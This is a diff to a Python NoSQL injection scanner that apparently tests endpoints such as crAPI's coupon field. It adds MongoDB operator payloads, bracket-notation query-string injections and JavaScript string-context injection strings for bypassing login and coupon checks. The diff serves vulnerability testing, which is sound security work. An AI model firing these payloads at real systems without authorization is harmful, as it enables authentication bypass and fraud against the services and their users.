@@ -84,6 +84,33 @@ _NOSQL_SUCCESS_INDICATORS: list[str] = [
     "success",
     "admin",
     "user",
+    "coupon",
+    "discount",
+    "valid",
+    "applied",
+    "redeemed",
+]
+
+# Bracket-notation payloads for query string (works even on POST endpoints
+# when framework parses both body and query string, e.g., Express/Node.js)
+_BRACKET_PAYLOADS: list[str] = [
+    "[$ne]=",
+    "[$gt]=",
+    "[$exists]=true",
+    "[$regex]=.*",
+    "[$ne]=invalid_xyz_9999",
+    "[$nin][]=invalid_xyz_9999",
+]
+
+# Extra fields appended to string payloads when the server rejects object injection
+# (type-validated fields like crAPI coupon_code that must be strings)
+_STRING_CONTEXT_PAYLOADS: list[str] = [
+    "' || '1'=='1",
+    "\"; return 1; var x=\"",
+    "abc' || this.password.match(/.*/) || 'a'=='b",
+    "'; return true; var a='",
+    "%00",
+    "' || 1==1 || '",
 ]
 
 _NOSQL_ERROR_INDICATORS: list[str] = [
@@ -170,17 +197,27 @@ class NoSqlTester:
         self.timeout = timeout
         self._extra_headers: dict[str, str] = extra_headers or {}
 
-    async def test(self, url: str, method: str = "GET") -> NoSqlResult:
+    async def test(
+        self,
+        url: str,
+        method: str = "GET",
+        body: dict[str, Any] | None = None,
+        params: list[str] | None = None,
+    ) -> NoSqlResult:
         """Run NoSQL injection tests against a target URL.
 
         Obtains a baseline response, then for each query parameter injects
         MongoDB operator payloads via GET and POST and compares results.
         When no query parameters exist but ``method`` is POST, probes
-        the endpoint with JSON operator payloads directly.
+        the endpoint with JSON operator payloads directly using the provided
+        ``body`` fields (or falls back to guessing email/password).
 
         Args:
             url: Target URL to test.
             method: HTTP method hint — ``"GET"`` or ``"POST"``.
+            body: Known request body dict (from injection_test). Used to inject
+                operators into the actual field names (e.g. ``coupon_code``).
+            params: Known parameter names to test. Overrides auto-detection.
 
         Returns:
             ``NoSqlResult`` with all discovered NoSQL injection vulnerabilities.
@@ -189,16 +226,22 @@ class NoSqlTester:
         result = NoSqlResult(target=url)
 
         parsed = urlparse(url)
-        params = parse_qs(parsed.query, keep_blank_values=True)
+        url_params = parse_qs(parsed.query, keep_blank_values=True)
+
+        # Merge explicit params with URL query params
+        param_override = {p: ["test"] for p in params} if params else {}
+        effective_params = param_override or url_params
 
         async with create_client(
             timeout=self.timeout,
             headers=self._extra_headers,
         ) as client:
-            if not params:
+            if not effective_params:
                 logger.debug("No query parameters — skipping GET probes, trying POST JSON for %s", url)
-                # Still try POST JSON injection (e.g., MongoDB $ne operator bypass on login endpoints)
-                await self._probe_post_json(client, url, result)
+                await self._probe_post_json(client, url, result, body=body)
+                # Also try bracket notation via query string for POST endpoints
+                if body and not result.vulnerable:
+                    await self._probe_bracket_notation(client, parsed, body, result)
                 result.duration_ms = (time.monotonic() - start) * 1000
                 if result.vulnerabilities:
                     logger.info(
@@ -212,15 +255,15 @@ class NoSqlTester:
             # Obtain baseline response
             baseline_text = await self._get_baseline(client, url)
 
-            for param_name in params:
+            for param_name in effective_params:
                 try:
                     for payload in _NOSQL_PAYLOADS:
                         # GET probe: URL-encoded payload in query string
-                        vuln = await self._probe_get(client, parsed, params, param_name, payload, baseline_text)
+                        vuln = await self._probe_get(client, parsed, url_params or {param_name: ["test"]}, param_name, payload, baseline_text)
                         if vuln:
                             result.vulnerabilities.append(vuln)
                             result.vulnerable = True
-                            continue  # skip POST probe for same param/payload
+                            continue
 
                         # POST probe: JSON body with operator object
                         vuln = await self._probe_post(client, url, param_name, baseline_text)
@@ -230,6 +273,10 @@ class NoSqlTester:
                 except Exception as exc:
                     logger.warning("NoSQL test error on param %s: %s", param_name, exc)
                     continue
+
+            # If we have a body with known fields, also probe POST JSON with those fields
+            if body and not result.vulnerable:
+                await self._probe_post_json(client, url, result, body=body)
 
         result.duration_ms = (time.monotonic() - start) * 1000
         logger.info(
@@ -304,50 +351,128 @@ class NoSqlTester:
         client: httpx.AsyncClient,
         url: str,
         result: NoSqlResult,
+        body: dict[str, Any] | None = None,
     ) -> None:
-        """Inject NoSQL operator payloads via POST JSON body (no query params needed).
+        """Inject NoSQL operator payloads via POST JSON body.
 
-        Targets authentication-style endpoints that accept ``{"email": ..., "password": ...}``
-        or similar JSON bodies. Tries MongoDB operators like ``$ne``, ``$gt``, ``$regex``
-        to bypass authentication.
+        If ``body`` is provided (from injection_test), injects operators into
+        each field of the actual request body (e.g. ``coupon_code`` from crAPI).
+        Falls back to guessing common field names (email/password) when no body
+        is known.
+
+        Also tries bracket notation via query string as a fallback when object
+        injection is rejected (type-validated fields).
         """
-        # Get baseline: POST with normal credentials to establish a comparison
+        # Get baseline using the actual body (or a dummy one)
         baseline_text = ""
+        baseline_body = body or {"email": "baseline@test.com", "password": "baseline_wrong"}
         try:
-            baseline_resp = await client.post(
-                url,
-                json={"email": "baseline@test.com", "password": "baseline_wrong"},
-            )
+            baseline_resp = await client.post(url, json=baseline_body)
             baseline_text = baseline_resp.text
         except httpx.HTTPError:
             pass
 
-        # Operator payloads for POST JSON injection
-        operator_payloads: list[tuple[str, dict]] = [
-            ('{"$ne": ""}', {"email": {"$ne": ""}, "password": {"$ne": ""}}),
-            ('{"$gt": ""}', {"email": {"$gt": ""}, "password": {"$gt": ""}}),
-            ('{"$regex": ".*"}', {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
-            ('{"$ne": null}', {"email": {"$ne": None}, "password": {"$ne": None}}),
-            ('{"$in": [...]}', {"email": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}),
-            ('{"$where": "1==1"}', {"email": "admin", "password": {"$where": "1==1"}}),
-            ('{"$exists": true}', {"email": {"$exists": True}, "password": {"$exists": True}}),
-            # username/password variant (common field names)
-            ("username $ne", {"username": {"$ne": ""}, "password": {"$ne": ""}}),
-            ("user $ne", {"user": {"$ne": ""}, "pass": {"$ne": ""}}),
-        ]
+        # Strategy 1: Replace each field value with an operator object
+        fields = list(body.keys()) if body else ["email", "password", "username", "user", "pass"]
 
-        for payload_desc, json_body in operator_payloads:
-            try:
-                resp = await client.post(url, json=json_body)
-            except httpx.HTTPError as exc:
-                logger.debug("NoSQL POST JSON probe error (payload=%s): %s", payload_desc, exc)
-                continue
+        for field_name in fields:
+            operator_payloads: list[tuple[str, dict]] = [
+                ('{"$ne": null}', {**baseline_body, field_name: {"$ne": None}}),
+                ('{"$ne": ""}', {**baseline_body, field_name: {"$ne": ""}}),
+                ('{"$gt": ""}', {**baseline_body, field_name: {"$gt": ""}}),
+                ('{"$regex": ".*"}', {**baseline_body, field_name: {"$regex": ".*"}}),
+                ('{"$exists": true}', {**baseline_body, field_name: {"$exists": True}}),
+                ('{"$where": "1==1"}', {**baseline_body, field_name: {"$where": "1==1"}}),
+                ('{"$ne": "invalid_xyz_9999"}', {**baseline_body, field_name: {"$ne": "invalid_xyz_9999"}}),
+            ]
 
-            vuln = self._evaluate_response(resp.text, baseline_text, "body", payload_desc, "POST JSON")
-            if vuln:
-                result.vulnerabilities.append(vuln)
-                result.vulnerable = True
-                return  # One confirmed finding is enough
+            for payload_desc, json_body in operator_payloads:
+                try:
+                    resp = await client.post(url, json=json_body)
+                except httpx.HTTPError as exc:
+                    logger.debug("NoSQL POST JSON probe error (field=%s, payload=%s): %s", field_name, payload_desc, exc)
+                    continue
+
+                vuln = self._evaluate_response(resp.text, baseline_text, field_name, payload_desc, "POST JSON")
+                if vuln:
+                    result.vulnerabilities.append(vuln)
+                    result.vulnerable = True
+                    return
+
+        # Strategy 2: All-fields operator injection (auth bypass style)
+        if not body:
+            multi_field_payloads = [
+                ("username $ne", {"username": {"$ne": ""}, "password": {"$ne": ""}}),
+                ("user $ne", {"user": {"$ne": ""}, "pass": {"$ne": ""}}),
+                ('{"$in": [...]}', {"email": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}),
+            ]
+            for payload_desc, json_body in multi_field_payloads:
+                try:
+                    resp = await client.post(url, json=json_body)
+                except httpx.HTTPError as exc:
+                    logger.debug("NoSQL POST JSON probe error (payload=%s): %s", payload_desc, exc)
+                    continue
+                vuln = self._evaluate_response(resp.text, baseline_text, "body", payload_desc, "POST JSON")
+                if vuln:
+                    result.vulnerabilities.append(vuln)
+                    result.vulnerable = True
+                    return
+
+        # Strategy 3: String-context injection when object injection may be rejected
+        if body:
+            for field_name, original_value in body.items():
+                if not isinstance(original_value, str):
+                    continue
+                for str_payload in _STRING_CONTEXT_PAYLOADS:
+                    test_body = {**baseline_body, field_name: str_payload}
+                    try:
+                        resp = await client.post(url, json=test_body)
+                    except httpx.HTTPError:
+                        continue
+                    vuln = self._evaluate_response(resp.text, baseline_text, field_name, str_payload, "POST JSON string")
+                    if vuln:
+                        result.vulnerabilities.append(vuln)
+                        result.vulnerable = True
+                        return
+
+    async def _probe_bracket_notation(
+        self,
+        client: httpx.AsyncClient,
+        parsed: Any,
+        body: dict[str, Any],
+        result: NoSqlResult,
+    ) -> None:
+        """Try bracket-notation NoSQL injection via query string on POST endpoints.
+
+        Frameworks like Express/Node.js parse both query string and body, so
+        ``?field[$ne]=null`` can bypass validation even when the body field is
+        type-checked as string (e.g., crAPI coupon_code).
+        """
+        # Baseline via POST with original body
+        baseline_text = ""
+        try:
+            url_clean = parsed.geturl()
+            baseline_resp = await client.post(url_clean, json=body)
+            baseline_text = baseline_resp.text
+        except httpx.HTTPError:
+            pass
+
+        for field_name in body:
+            for bracket_suffix in _BRACKET_PAYLOADS:
+                # Build URL with bracket notation: ?field[$ne]=
+                operator_param = f"{field_name}{bracket_suffix}"
+                new_query = parsed.query + ("&" if parsed.query else "") + operator_param
+                test_url = parsed._replace(query=new_query).geturl()
+                try:
+                    resp = await client.post(test_url, json=body)
+                except httpx.HTTPError:
+                    continue
+                payload_desc = f"{field_name}{bracket_suffix} (bracket notation)"
+                vuln = self._evaluate_response(resp.text, baseline_text, field_name, payload_desc, "POST bracket")
+                if vuln:
+                    result.vulnerabilities.append(vuln)
+                    result.vulnerable = True
+                    return
 
     def _evaluate_response(
         self,
